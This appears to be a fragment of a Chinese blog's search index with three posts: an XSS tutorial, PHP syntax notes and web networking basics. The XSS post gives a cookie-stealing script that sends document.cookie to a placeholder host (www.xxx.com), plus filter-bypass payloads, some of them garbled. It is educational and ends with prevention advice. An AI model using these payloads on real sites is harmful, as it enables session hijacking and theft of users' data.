        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击</title>
      <link href="/2021/08/22/XSS%E6%94%BB%E5%87%BB/"/>
      <url>/2021/08/22/XSS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h1><h2 id="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"><a href="#定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。" class="headerlink" title="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"></a>定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。</h2><h2 id="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"><a href="#危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。" class="headerlink" title="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"></a>危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。</h2><h2 id="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"><a href="#原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。" class="headerlink" title="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"></a>原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如<title>与</title>之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。</h2><h3 id="例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com"><a href="#例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com" class="headerlink" title="例如：用户通过访问url:http://127.0.0.1/?name=abc,就会在浏览器输入如下信息: hello abc,如果我们传递这样的一个url:http://127.0.0.1/?name= &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:http://127.0.0.1/?name= &#60; script&#62;document.location.href=’http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/"></a>例如：用户通过访问url:<a href="http://127.0.0.1/?name=abc,%E5%B0%B1%E4%BC%9A%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF">http://127.0.0.1/?name=abc,就会在浏览器输入如下信息</a>: <strong>hello abc</strong>,如果我们传递这样的一个url:<a href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:<a href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;document.location.href=’<a href="http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,%E8%BF%99%E6%A0%B7%E7%B1%BB%E4%BC%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B0%B1%E4%BC%9A%E5%B0%86%E5%BD%93%E5%89%8D%E7%9A%84cookie%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%9Awww.xxx.com/">http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/</a></h3><h2 id="类型-从攻击代码的工作方式可以分为三个类型"><a href="#类型-从攻击代码的工作方式可以分为三个类型" class="headerlink" title="类型:从攻击代码的工作方式可以分为三个类型"></a>类型:从攻击代码的工作方式可以分为三个类型</h2><ol><li>持久性跨站：最直接的危害类型，跨站代码存储在服务器中。存储型：主要让用户输入数据。其他用户浏览查看的地方，例如留言、评论、博客、日志等表单。过程：浏览器-后端-浏览器</li><li>非持久性跨站：反射性跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。过程：浏览器-后端-数据库-后端-浏览器</li><li>DOM跨站（DOM XSS）：DOM（文档对象模型），客户端脚本处理逻辑导致的安全问题。是指受害者端的页面脚本在修改本地页面DOM环境是未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果的差异的原因是对本地DOM的恶意篡改利用。过程：url-浏览器</li></ol><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>常见的xss的攻击手段和目的：</p><ol><li>盗用cookie,获取敏感信息。</li><li>利用植入Flash,通过crossdomain权限设置进一步获取更高权限，或者利用Java等此类的操作。</li><li>利用iframe、frame、XMLHttpRequest或者上述flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li><li>利用可被攻击的域收到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li><li>在访问极大的一些页面上的xss可以攻击游戏额小型的网站，实现DDoS攻击效果</li></ol><h2 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h2><ol><li>可以用**/**代替空格。</li><li>运用大小写绕过：&lt;imGRC=xonerRo=alert(“xss”)&gt;</li><li><strong>双写关键词</strong>：&lt;imimggsrsrcc=xonerror=alert(“xss”)&gt;</li><li><strong>利用eval字符拼接</strong>：&lt;imgsrc=”x” onerror=”a=alert;b=’(xss);’ ;eval(a+b+c)”&gt;</li><li><strong>利用top</strong>：<script>top<a href="%E2%80%99xss%E2%80%98">"al"+"ert"</a>;</script></li><li>其他字符混淆：可以利用注释、标签的优先级：&lt;<script>alert("xss");//<</script>   2.<title>&lt;img src=</title>&gt;&lt;img src=x onerror=”alert(“xss”);”&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效 </li><li>编码绕过: Unicode 编码绕过<strong>如果是在html中，我们可以不用应该好。绕过是在js中，我们可以通过反引号代替单双引号</strong>&lt;img src=”C:/Users/86182/Desktop/x” onerror=alert(<code>xss</code>);&gt; 当括号被过滤的时候我们可以使用throw来绕过&lt;svg/onload=”window.onerror=eval;throw’=alert\x281\x29’;”&gt;过滤</li></ol><h2 id="预防xss"><a href="#预防xss" class="headerlink" title="预防xss"></a>预防xss</h2><ol><li>过滤一些危险的字符，以及转义&amp;&lt;&gt;” ‘ /等危险的字符</li><li>HTTP-only Cookie：禁止JavaScript读取某县敏感的Cookie，攻击者完成XSS后注入后也无法窃取Cookie</li><li>设置CSP(Conrwnr Awxurity Policy)</li><li>输入内容长短限制</li></ol></script></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基本语法</title>
      <link href="/2021/08/21/php%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/08/21/php%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="php基本语法"><a href="#php基本语法" class="headerlink" title="php基本语法"></a>php基本语法</h1><ol><li>PHP 脚本以 <strong><?php** 开始，以 **?></strong></li><li>PHP 文件的默认文件扩展名是 “.php”。</li><li>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。 </li><li>有两种在浏览器输出文本的基础指令：<strong>echo</strong> 和 <strong>print</strong>。</li></ol><h2 id="PHP-echo-print-和-print-r-语句"><a href="#PHP-echo-print-和-print-r-语句" class="headerlink" title="PHP echo ,print 和 print_r 语句"></a>PHP echo ,print 和 print_r 语句</h2><p>echo , print 和 print_r的区别:</p><ol><li><p>echo  - 可以输出一个或多个字符串</p></li><li><p>print  - 只能输出简单类型变量的值,如int,string</p></li><li><p>print_r - 可以输出复杂类型变量的值,如数组,对象</p></li></ol><p>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p><p>print 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。</p><h2 id="php数据类型"><a href="#php数据类型" class="headerlink" title="php数据类型"></a>php数据类型</h2><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。</p><p>出来个别boolean和null的类型其余的都和c语言差不多，c有些是简写。</p><h2 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h2><p>有时知道字符串值的长度是很有用的。</p><p>strlen() 函数返回字符串的长度（字符数）</p><h2 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h2><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE</p><h2 id="运算符和c也差不多"><a href="#运算符和c也差不多" class="headerlink" title="运算符和c也差不多"></a>运算符和c也差不多</h2><h2 id="PHP-递增-递减运算符"><a href="#PHP-递增-递减运算符" class="headerlink" title="PHP 递增/递减运算符"></a>PHP 递增/递减运算符</h2><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web服务器通讯原理</title>
      <link href="/2021/08/21/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/"/>
      <url>/2021/08/21/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Web服务器通讯原理"><a href="#Web服务器通讯原理" class="headerlink" title="Web服务器通讯原理"></a>Web服务器通讯原理</h1><ol><li><strong>IP</strong></li></ol><ul><li>正统定义：互联网协议地址。</li><li>可以俗气的理解成：ip实际上就是地址，如果我想到你家去找你玩，就要知道你家住在哪里，ip就是你电脑的地址，在网络上可以通过ip来访问你的计算机。</li></ul><p>图片关系<img src="https://img-blog.csdnimg.cn/20200625114421863.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="IP关系"></p><ol start="2"><li><strong>域名</strong></li></ol><ul><li>域名实际上是为了人们方便记忆而创造的一个字符型标识。</li></ul><ol start="3"><li><strong>DNS</strong></li></ol><ul><li><p>DNS是将域名转化为IP的一个网络协议.</p></li><li><p>通俗理解为ip是计算机所理解的语言，为了方便人们记忆有了域名，而DNS是把域名连接到ip的一个方法。</p></li></ul><ol start="4"><li><strong>端口</strong></li></ol><ul><li>端口主要是网络接口，类似于电脑的接口比如你去访问别人的网站，一般来说实际上你是去他的80端口进行通信<br>0端口是预留端口，一般不会用到。</li></ul><ol start="5"><li><strong>HTTP协议</strong></li></ol><ul><li>HTTP协议也叫超文本传输协议，是互联网上应用最为广泛的一种网络协议。<br>https比http多了一个叫做证书的东西，目的是为了防止中途截取。</li></ul><h2 id="从访客的角度看网页浏览流程"><a href="#从访客的角度看网页浏览流程" class="headerlink" title="从访客的角度看网页浏览流程"></a>从访客的角度看网页浏览流程</h2><ol><li><strong>用户浏览器输入协议：//域名。</strong><pre><code>例如：http：//baidu.cn/</code></pre></li><li><strong>用户浏览器通过系统向DNS查询域名对应的ip地址。</strong></li><li><strong>用户浏览器向查询到的IP地址发起http请求。</strong></li><li><strong>服务器解析用户请求，从中提取数据，处理后向用户返回一个http相应。</strong></li><li><strong>浏览器收到响应后提取状态，协议编码，正文的有效信息，然后翻译成人们可以看懂的图形界面并显示。</strong></li></ol><h2 id="常见的服务器系统"><a href="#常见的服务器系统" class="headerlink" title="常见的服务器系统"></a>常见的服务器系统</h2><p><img src="https://img-blog.csdnimg.cn/20200625114559839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片解释"></p><ol><li><strong>Windows系统与Linux系统的区别</strong></li></ol><ul><li><p>Windows系统的路径： C：\Users\blackJone&gt;</p></li><li><p>Linux系统的路径： ：/etc/init#</p></li></ul><ol start="2"><li><strong>绝对路径与相对路径</strong></li></ol><p><img src="https://img-blog.csdnimg.cn/20200625114249599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片"></p><ul><li> 例如：文件”icon.jpg”存在img文件中。绝对路径为D:/wamp/www/img/icon.jpg。那么相对路径为 ./img/icon.jpg。</li></ul><h2 id="web的容器"><a href="#web的容器" class="headerlink" title="web的容器"></a>web的容器</h2><ul><li> Web容器是可以向发出请求的浏览器发送文档的程序。是一种被动的程序，只有其他计算机发出请求时web容器才会相应。</li><li> Web容器的主要功能是存储，处理和传递网页给用户，客户端和服务器之间使用http协议进行通信，交付的页面是HTML文档。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200625114627778.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片"></p><p>常见的Web容器</p><h2 id="公网和内网的区别"><a href="#公网和内网的区别" class="headerlink" title="公网和内网的区别"></a>公网和内网的区别</h2><table><thead><tr><th></th><th>公网</th><th>内网</th></tr></thead><tbody><tr><td>网段上的区别</td><td>大部分ip地址均为公网。</td><td>内网IP通常包括10.0.0<del>10.255.255.255,以及192.168.0.0</del>192.168.255.255等。</td></tr><tr><td>网络可达性的区别</td><td>外网IP网络提供商（ISP）服务器分配的全球唯一的IP地址，并且每个IP地址仅分配给一个网络设备。通过公网IP，用户无需经过路由器或交换机，可以直接连接internet。</td><td>内网IP局域网，网线都是连接在同一个交换机上，因此IP地址是由交换机或者路由器进行分配，而且每一个IP也是有所不同，但此类IP地址只可以在局域网内访问，无法直接访问internet。如果要访问Internet，则需要通过NAT或者PROXY等技术交换，把内网IP和端口映射为公网的ip和端口，方可访问internet。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
